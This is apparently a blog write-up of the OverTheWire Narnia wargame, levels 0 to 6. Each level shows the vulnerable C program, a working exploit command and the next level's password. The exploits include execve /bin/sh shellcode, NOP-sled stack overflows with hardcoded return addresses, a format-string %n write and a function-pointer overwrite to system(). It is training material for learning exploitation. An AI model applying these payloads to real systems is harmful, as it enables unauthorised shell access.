---
layout: post
title: OverTheWire Narnia Level 0-6
---

* TOC
{:toc}

More information is available [here](http://overthewire.org/wargames/narnia/).

# 1. Level 0

```
$ ssh narnia0@narnia.labs.overthewire.org
password: narnia0
```

```
$ cat /games/narnia/narnia0.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef)
        system("/bin/sh");
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

```
$ ((echo -e "12345123451234512345\xef\xbe\xad\xde");(echo cat /etc/narnia_pass/narnia1)) | /games/narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 12345123451234512345ﾭ�
val: 0xdeadbeef
efeidiedae
```

# 2. Level 1

```
$ cat /games/narnia/narnia1.c
```

```cpp
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

```
$ export EGG=`echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`
$ /games/narnia/narnia1
```

```
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

# 3. Level 2

```
$ cat /games/narnia/narnia2.c
```

```cpp
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

```
$ /games/narnia/narnia2 `python -c 'print "\x90"*108+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*4+"\xd0\xd5\xff\xff"'`
```

```
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

# 4. Level 3

```
$ cat /games/narnia/narnia3.c
```

```cpp
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd, ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

Overwrite `ofile` with `/tmp/ving/n4ps`.

```
$ mkdir -p /tmp/ving/narnia3---------------/tmp/ving
$ ln -s /etc/narnia_pass/narnia4 /tmp/ving/narnia3---------------/tmp/ving/n4ps
$ touch /tmp/ving/n4ps
```

```
$ /games/narnia/narnia3 /tmp/ving/narnia3---------------/tmp/ving/n4ps
copied contents of /tmp/ving/narnia3---------------/tmp/ving/n4ps to a safer place... (/tmp/ving/n4ps)
```

```
$ cat /tmp/ving/n4ps
thaenohtai
```

# 5. Level 4

```
$ cat /games/narnia/narnia4.c
```

```cpp
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

```
$ /games/narnia/narnia4 `python -c 'print "\x90"*219+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*27+"\xf0\xd4\xff\xff"'`
```

```
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

# 6. Level 5

```
$ cat /games/narnia/narnia5.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof (buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i==500){
        printf("GOOD\n");
        system("/bin/sh");
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf ("i = %d (%p)\n", i, &i);
    return 0;
}
```

This is a format string vulnerability challenge.

```
$ /games/narnia/narnia5 $(python -c 'print "\xcc\xd6\xff\xff"')%x%x%x%472u%n
Change i's value from 1 -> 500. GOOD
```

```
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

# 7. Level 6

```
$ cat /games/narnia/narnia6.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
    if(((unsigned long)fp & 0xff000000) == get_sp())
        exit(-1);
    fp(b1);

    exit(1);
}
```

After the binary begins to execute the `system()` function is loaded, since it is part of the `stdlib.h`.

```
$ /games/narnia/narnia6 `python -c 'print "A"*8+"\x70\x1e\xe6\xf7"'` `python -c 'print "B"*8+"/bin/sh"'`
```

`argv[1]` overwrites `fp` with `system()` function, and `argv[2]` overwrites `b1` with `/bin/sh`.

```
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
```
